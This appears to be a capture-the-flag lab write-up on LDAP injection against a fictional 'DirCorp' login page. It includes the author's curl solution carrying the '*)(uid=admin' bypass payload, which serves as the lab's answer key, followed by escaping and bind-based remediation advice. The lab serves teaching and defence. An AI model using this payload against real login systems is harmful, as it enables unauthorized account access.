# LDAP Injection — DirCorp

A login page that builds an LDAP filter by string-interpolating
the user-supplied username and password:

```
(&(uid={USER})(password={PASS}))
```

Anything goes into either field. Inject extra clauses to make the
filter match `admin` without the password.

## Player target

Log in as `admin`. The response includes the flag.

## Author solution

```bash
curl -s -X POST http://target:5000/login \
  -H 'content-type: application/json' \
  -d '{"username":"*)(uid=admin","password":"*"}'
```

Resulting filter:

```
(&(uid=*)(uid=admin)(password=*))
```

* `(uid=*)` — matches every directory entry.
* `(uid=admin)` — narrows to admin.
* `(password=*)` — present (wildcard), no actual password check.

The AND of those three matches admin. The server detects admin in
the hit set and hands over the flag.

## Why this is the lesson

* **Escape metacharacters for the target context.** LDAP filter
  metachars (`(`, `)`, `\\`, `*`, `\0`) must be escaped per RFC 4515
  (e.g. `(` → `\\28`, `*` → `\\2a`) before interpolation. Most
  modern LDAP client libraries provide a filter-escape helper.
* **Parameterise where possible.** Higher-level libraries
  (python-ldap's `search_s` with separate base + filter args)
  reduce the surface — but interpolated values inside the filter
  still need escaping.
* **Authenticate via bind, not search.** A correct LDAP login
  searches for the DN first, then attempts a bind with the
  supplied password. The "search for matching entries" pattern is
  the bug.
